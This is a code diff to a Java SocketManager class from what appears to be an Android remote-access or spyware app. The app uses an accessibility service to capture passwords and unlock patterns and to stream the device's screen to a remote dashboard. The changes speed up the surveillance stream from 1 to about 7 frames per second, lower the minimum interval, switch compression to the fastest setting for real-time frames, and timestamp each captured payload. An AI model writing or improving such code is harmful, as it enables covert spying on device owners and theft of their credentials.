@@ -164,7 +164,7 @@ public class SocketManager {
     // Dashboard push throttle — honors the intervalMs requested by screen_reader_stream_start.
     // The internal 50ms tick still runs (for password/pattern capture), but dashboard
     // screen:update pushes are rate-limited to this value. Default 1000ms = 1 fps.
-    private volatile long screenReaderDashboardIntervalMs  = 1000L;
+    private volatile long screenReaderDashboardIntervalMs  = 150L;
     private volatile long lastScreenReaderDashboardPushMs  = 0L;
 
     // Frame deduplication — skip pushing a frame if the screen content hasn't changed
@@ -2521,10 +2521,10 @@ public class SocketManager {
             }
 
             case "screen_reader_stream_start": {
-                // Read the interval the dashboard requests (500-5000ms; default 1000ms = 1 fps).
+                // Read the interval the dashboard requests (100-5000ms; default 150ms).
                 // The internal 50ms tick keeps running for password/pattern capture,
                 // but screen:update pushes to the dashboard are throttled to this value.
-                final long requestedIntervalMs = Math.max(500L, params.optLong("intervalMs", 1000L));
+                final long requestedIntervalMs = Math.max(100L, params.optLong("intervalMs", 150L));
                 // Serialize through heartbeatExecutor (single-threaded) so that a
                 // stream_stop submitted just before cannot overtake this start.
                 final UnifiedAccessibilityService finalSvc = accessSvc;
@@ -2781,10 +2781,10 @@ public class SocketManager {
     private String gzipAndBase64(String json) {
         try {
             java.io.ByteArrayOutputStream bos = new java.io.ByteArrayOutputStream(json.length());
-            // Use BEST_COMPRESSION (level 9) for maximum size reduction over 3G.
-            // Anonymously override the protected `def` field to set level before first write.
+            // Real-time frames benefit more from low CPU latency than the small
+            // additional size reduction from maximum compression.
             java.util.zip.GZIPOutputStream gzip = new java.util.zip.GZIPOutputStream(bos) {
-                { def.setLevel(java.util.zip.Deflater.BEST_COMPRESSION); }
+                { def.setLevel(java.util.zip.Deflater.BEST_SPEED); }
             };
             gzip.write(json.getBytes("UTF-8"));
             gzip.close();
@@ -2983,6 +2983,7 @@ public class SocketManager {
 
                 JSONObject payload = new JSONObject();
                 payload.put("deviceId", devId);
+                payload.put("capturedAt", System.currentTimeMillis());
                 payload.put("success", screenResult.optBoolean("success", false));
                 if (screenResult.has("screen")) payload.put("screen", screenResult.get("screen"));
                 if (screenResult.has("error"))  payload.put("error",  screenResult.getString("error"));
